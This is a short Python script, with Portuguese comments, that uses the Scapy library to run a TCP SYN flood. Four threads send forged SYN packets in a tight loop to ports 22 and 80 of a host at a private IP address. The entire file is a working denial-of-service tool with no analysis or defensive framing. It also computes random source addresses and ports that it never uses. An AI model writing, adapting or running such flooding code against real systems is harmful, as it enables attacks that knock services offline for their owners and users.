from scapy.all import *
from threading import Thread

def flood():
    src_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4))
    src_port = random.randint(4000, 9000) # gera portas de origem aleatorias, entre os intervalos 4000 e 9000
    p=IP(dst='192.168.15.17',id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
    #pkg = IP(dst='192.168.15.17', ttl=255, id=1111)/TCP(sport=RandShort(), dport=80, flags='S', window=5000, seq=0, ack=1000)
    ls(p)
    _, _ = srloop(p, inter=0.0001, retry=2, timeout=4)


t1 = Thread(target=flood)
t2 = Thread(target=flood)
t3 = Thread(target=flood)
t4 = Thread(target=flood)

t1.start()
t2.start()
t3.start()
t4.start()
